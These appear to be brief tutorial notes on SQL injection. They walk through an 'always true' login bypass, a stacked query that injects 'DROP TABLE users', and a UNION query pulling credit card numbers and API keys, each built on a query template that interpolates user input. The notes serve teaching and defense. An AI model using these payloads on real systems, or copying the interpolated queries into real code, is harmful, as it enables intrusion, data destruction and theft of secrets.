### Injection Attack

#### Always True 
SELECT id, username, is_admin, email  FROM users WHERE username = '${username}' AND password = '${password}'

SELECT id, username, is_admin, email  FROM users WHERE username = 'alice' OR '1'='1' AND password = '${password}'

SELECT id, username, is_admin, email  FROM users WHERE (username = 'alice') OR ('1'='1' AND password = 'asjdfajslkdf')

SELECT id, username, is_admin, email  FROM users WHERE (username = 'alice') OR (true AND false)

SELECT id, username, is_admin, email  FROM users WHERE (username = 'alice') OR false

SELECT id, username, is_admin, email  FROM users WHERE (username = 'alice')

#### Query Stacking

INSERT INTO blog_posts (id, title, content) VALUES (${id}, '${req.body.title}', '${req.body.content}')

INSERT INTO blog_posts (id, title, content) VALUES (${id}, 'title', 'test'); 
DROP TABLE users; 


--')


### Data Exfilteration Attack


SELECT username, email FROM users WHERE username = '${username}'

SELECT username, email FROM users WHERE username = 'admin' 
UNION 
SELECT credit_card, api_key FROM users WHERE '1'='1'

